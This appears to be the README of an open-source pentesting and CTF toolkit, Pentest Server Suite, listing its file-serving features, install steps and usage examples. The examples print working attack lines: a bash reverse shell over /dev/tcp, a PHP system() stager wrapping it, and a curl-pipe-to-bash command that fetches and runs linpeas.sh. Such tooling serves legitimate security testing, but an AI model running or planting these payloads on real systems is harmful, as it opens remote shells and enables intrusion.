# 🛠️ Pentest Server Suite (PSS) 🛡️

Pentest Server Suite (PSS) is a versatile toolkit designed to aid in pentesting and CTF challenges by providing a streamlined command-line interface for various tasks. It simplifies serving and receiving files over HTTP, FTP, and SMB protocols, generates reverse shells, and facilitates the creation of commands for tasks like downloading/executing files and setting up listeners.

## 🚀 Features

- Serve/Receive files over:
  - HTTP 🌐 (with template support)
  - SMB 🔒
  - FTP 📂
- Generate reverse shells:
  - Create copy & paste commands for tools like netcat, socat and the most commonly used shells 🐚
- Generate commands for:
  - Downloading/executing files using tools like curl 📥
  - Setting up listeners with netcat, socat, etc. 🎧
  - Creating msfvenom/nim shell payloads 🚀

## ⚙️ Installation

Clone the repository and install dependencies:

```bash
apt install python3.12 python3.12-full python3.12-dev python3.12-venv -y
cd ~ && git clone https://github.com/Jnnshschl/PentestServerSuite.git pss
chmod +x ~/pss/pss.sh
ln -s ~/pss/pss.sh /usr/bin/pss
```

Start the server:

```bash
pss -S ./Tools/
```

## 🚀 Usage Examples

Configure template variables:

```bash
shells options

set LHOST 10.0.0.6
# or by NIC name
set LHOST tun0
```

Generate a simple bash reverse shell:

```bash
pss> shell build bash/i_c
# /bin/bash -c 'bash -i >& /dev/tcp/192.168.1.51/4711 0>&1'
```

Generate php code to launch a revese shell (shell will also be served over HTTP at http://.../php/system):

```bash
pss> shell set bash/i_c
pss> stager build php/system
# <?php system("/bin/bash -c 'bash -i >& /dev/tcp/192.168.1.51/4711 0>&1'"); ?>
```

Generate a curl command to launch a script from the serve folder:

```bash
pss> launcher generate http/curl-shell linux/linpeas.sh
# curl -sSL 'http://192.168.1.51/linux/linpeas.sh' | /bin/bash
```
